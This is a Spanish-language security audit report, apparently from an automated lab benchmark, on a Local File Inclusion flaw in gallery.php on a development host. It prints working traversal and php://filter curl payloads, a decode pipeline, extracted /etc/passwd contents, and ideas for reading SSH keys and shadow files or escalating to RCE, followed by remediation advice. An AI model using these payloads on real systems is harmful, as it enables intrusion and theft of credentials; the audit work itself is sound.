# Informe de auditoría LFI — 2026-04-27T16:18:56Z

Resumen:
- Objetivo: http://web.dev.local:8081
- Vulnerabilidad encontrada: Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`.
- Estado: VULN_FOUND = true, VULN_EXPLOITED = true

Puntos de entrada y reconocimiento:
- Página inicial fetch: curl --max-time 10 -s -D - http://web.dev.local:8081 -o homepage.html
- En la homepage se encontró enlace a gallery.php?page=...

Confirmación de LFI:
- Prueba trivial (traversal):
  curl -s -G -D - "http://web.dev.local:8081/gallery.php" --data-urlencode "page=../../../../etc/passwd" -o /tmp/lfi1.html
  - Resultado: la página devolvió un título que reflejaba el payload pero no el contenido directamente.

Bypass y extracción (payloads usados):
- Payload que permitió extraer contenido real del sistema usando el wrapper php://filter:
  php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
- Comando exacto utilizado para obtener la respuesta codificada y guardarla:
  curl -s -G -D - "http://web.dev.local:8081/gallery.php" --data-urlencode "page=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd" -o /tmp/lfi2.html
- Extracción y decodificado del bloque base64 de la respuesta:
  grep -oE '[A-Za-z0-9+/=]{80,}' /tmp/lfi2.html | tail -n1 | tr -d '\n' | base64 -d > /tmp/passwd_decoded.txt
  sed -n '1,80p' /tmp/passwd_decoded.txt

Evidencia (primeras líneas de /etc/passwd obtenidas):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Impacto y explotación adicional:
- Acceso a /etc/passwd confirmado (lectura de ficheros del sistema): esto cumple la condición de explotación (VULN_EXPLOITED = true).
- Con el mismo vector (php://filter) es posible intentar leer otros ficheros sensibles: /etc/shadow, /root/.ssh/id_rsa, archivos de configuración (.env, config.php, .git/config, backups).
- Vectores de escalada: si se encuentran credenciales o claves privadas, es posible escalar a acceso SSH; además, técnicas de Log Poisoning o escritura en áreas controladas podrían permitir RCE.

Recomendaciones:
1. No incluir archivos basándose directamente en parámetros sin validación; usar un mapa de páginas permitidas (whitelist) y resoluciones controladas.
2. Deshabilitar wrappers peligrosos o filtrar/normalizar valores para evitar php://filter y traversal (por ejemplo: comprobar que el valor sea uno de [modern, classic, abstract, about]).
3. Ejecutar revisión de permisos de ficheros y reducir el acceso a cuentas de servicio (ej. evitar que el proceso web lea ficheros sensibles).
4. Monitorizar y bloquear patrones de requests sospechosos que incluyan php://filter o múltiples ../ sequences.

Comandos y payloads (resumen exacto):
- curl homepage: curl --max-time 10 -s -D - http://web.dev.local:8081 -o homepage.html
- traversal PoC: curl -s -G -D - "http://web.dev.local:8081/gallery.php" --data-urlencode "page=../../../../etc/passwd" -o /tmp/lfi1.html
- php filter exploit: curl -s -G -D - "http://web.dev.local:8081/gallery.php" --data-urlencode "page=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd" -o /tmp/lfi2.html
- extract+decode: grep -oE '[A-Za-z0-9+/=]{80,}' /tmp/lfi2.html | tail -n1 | tr -d '\n' | base64 -d > /tmp/passwd_decoded.txt

Conclusión:
- La aplicación es vulnerable a LFI a través de gallery.php?page.
- Se logró explotar para leer /etc/passwd utilizando php://filter y decodificando la salida base64, por lo que se marca VULN_FOUND=true y VULN_EXPLOITED=true.

Autor: Auditor de seguridad (laboratorio autorizado)

